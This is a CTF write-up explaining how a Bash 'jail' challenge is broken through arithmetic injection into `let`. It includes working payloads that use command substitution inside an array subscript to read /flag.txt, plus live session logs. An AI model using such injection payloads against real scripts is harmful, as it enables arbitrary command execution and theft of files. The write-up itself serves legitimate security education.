# Another Bash Jail? - PolyU FYP CTF 2026 writeup

**Category:** Misc  
**Author:** siunam  
**Challenge description:** `Yet another Bash jail challenge? > Note: The flag format is FYPCTF26{[a-zA-Z0-9_]+}`

## 1. TL;DR

This challenge is a Bash arithmetic-injection jail.
The script only checks whether the input begins with hexadecimal characters, then passes the full string into:

```bash
let "guessHex = 0x$guess"
```

That is the core mistake. `let` does not safely parse data. It evaluates an arithmetic expression, which means attacker input is interpreted instead of treated as plain text. 
We can leverage the arithmetic parser as an output primitive to access the remote flag file

```bash
0 + a[$(cat /flag.txt | tee /proc/$$/fd/1)]
```

Final flag: 
```text
FYPCTF26{Using_fork_bomb_as_a_side_channel_oracle_xddd}
```

## 2. What Data We Have and What Is Special

The archive gives us three files:

- `chall.sh`
- `Dockerfile`
- `flag.txt`

The `flag.txt` in the archive is not the real flag. It is a decoy. That matters because a lot of CTF jail challenges ship a fake local flag to mislead solvers who only inspect the archive.

What we can infer from the files:

- The challenge is pure Bash, not compiled code.
- The server logic is fully visible, so the bug must be in shell parsing, quoting, or evaluation.
- The Dockerfile suggests the service runs inside a container, which usually means the real flag is mounted at runtime and not stored in the archive.
- The remote service is accessed through `nc challenge.hacktheflag.one 30028`, so the exploit must work in a single-line interactive session.

What the server interaction looks like:

1. The service prints a banner.
2. It asks for a guess in hexadecimal format.
3. It validates the guess with a weak regex.
4. It evaluates the guess with Bash arithmetic.
5. If the check passes, it prints a congratulatory message.

The important clue is that the challenge is not asking for a normal password comparison. It is asking us to supply something that survives shell evaluation.

## 3. Problem Analysis

The vulnerable part of the script is:

```bash
if [[ "$guess" =~ ^[0-9a-fA-F]+ ]]; then
    let "guessHex = 0x$guess" 2>/dev/null
fi
```

There are two mistakes here.

### Prefix-only validation

The regex checks only the beginning of the string. It does not require the full input to be hexadecimal.

That means this input is accepted:

```text
0,PATH=0
```

It starts with `0`, so the regex passes, even though the rest of the string is not hexadecimal.

This is why the first bypass works.

### Unsafe arithmetic evaluation

`let` evaluates an expression, not raw data.

In Bash arithmetic, the input is no longer just a number. It can include operators and constructs that change how the shell behaves.

That matters because:

- assignments can happen inside the expression
- the comma operator is valid arithmetic syntax
- array subscripts are parsed in arithmetic context
- command substitution can be triggered inside that context

The script also builds a random secret using:

```bash
secret=$(head -c 16 /dev/urandom | md5sum | cut -c1-16)
```

That is a separate detail. It looks like the thing we need to guess, but it is only the comparison target. If we can force the shell into a state where we can control execution or leak output, the random secret stops mattering.

The reasoning path is:

1. The jail accepts a non-pure-hex string.
2. The input is passed into `let`, so Bash arithmetic is evaluated.
3. A comma-based payload can alter shell state, which proves the evaluator is exploitable.
4. That first bypass still only changes program behavior; it does not disclose data.
5. To solve the challenge, we need a second payload that causes the remote host to print the flag.

## 4. Initial Guesses / First Try

The first useful payload is:

```bash
0,PATH=0
```

Why this was tried first:

- it starts with a valid hex prefix
- it is short
- it uses the arithmetic comma operator
- it is a common Bash-jail trick

### Live interaction

The remote service responded like this:

```text
└─$ nc challenge.hacktheflag.one 30028
=== Yet another Bash jail challenge? ===
[*] Guess the correct secret (In hexadecimal format):
0,PATH=0
/app/run: line 19: head: command not found
/app/run: line 19: cut: command not found
/app/run: line 19: md5sum: command not found
[+] Congratulations! You guessed the correct secret:
```

This tells us two things:

- the input reached the arithmetic evaluator
- the payload changed the environment enough to break later command execution

But it is still not the intended solve.

Why it is not enough:

- it only gives the success banner
- it does not leak `/flag.txt`
- the bundled `flag.txt` is fake anyway

So at this point the correct conclusion is: `0,PATH=0` is a bypass, not the end state. It gets us past the check, but we still need a payload that extracts data from the remote host.

## 5. Exploitation Walkthrough / Flag Recovery

The actual solution is to use arithmetic injection inside an array subscript and place command substitution there.

The working payload is:

```bash
0 + a[$(cat /flag.txt | tee /proc/$$/fd/1)]
```

### Why this works

- `a[...]` forces Bash to interpret the content as an arithmetic subexpression
- `$(...)` inside that arithmetic context is executed
- `cat /flag.txt` reads the real flag from the remote environment
- `tee /proc/$$/fd/1` copies the output to stdout
- `/proc/$$/fd/1` is a safe output path when `>` and `<` are blocked

The jail explicitly blocks `<` and `>`, so normal file redirection is not available. `tee` gives us a clean way to print data without those characters.

### Confirmation step

Before reading the real flag, it is useful to verify that the command substitution primitive really works.

For example:

```bash
0 + a[$(echo HI | tee /proc/$$/fd/1)]
```

If the service prints `HI`, then we know the arithmetic subscript is executing our command substitution.

### Finding the flag path

If the flag path is not obvious, we can search for it:

```bash
0 + a[$(find / -name flag.txt | tee /proc/$$/fd/1)]
```

This reveals:

```text
/flag.txt
```

### Final payload

Once the path is known, the final payload is:

```bash
0 + a[$(cat /flag.txt | tee /proc/$$/fd/1)]
```

This prints the real flag:

```text
=== Yet another Bash jail challenge? ===
[*] Guess the correct secret (In hexadecimal format):
0 + a[$(cat /flag.txt | tee /proc/$$/fd/1)]
FYPCTF26{Using_fork_bomb_as_a_side_channel_oracle_xddd}[-] Not the correct secret. Try harder!
```

## 6. What We Learned

- A prefix regex is not a real input validator.
- Bash arithmetic should never be applied directly to attacker-controlled strings.
- `let` is dangerous when used as if it were a numeric cast.
- A first bypass can be useful as a proof of exploitation, but it is not always the intended solve.
- Array subscripts in arithmetic context can become a command execution or output-leak primitive.
- `tee /proc/$$/fd/1` is a useful trick when direct redirection is filtered.
- A local archive flag may be a decoy, so the remote service output matters more than the shipped file.

## Appendix: Full Solve Summary

1. Inspect the Bash script and notice the weak hex-prefix check.
2. Test `0,PATH=0` to confirm the arithmetic evaluator is reachable.
3. Observe that this only breaks command lookup and does not reveal the real flag.
4. Switch to an arithmetic payload that executes command substitution inside an array subscript.
5. Use `tee /proc/$$/fd/1` to print the result back over the socket.
6. Read `/flag.txt` and recover the flag.
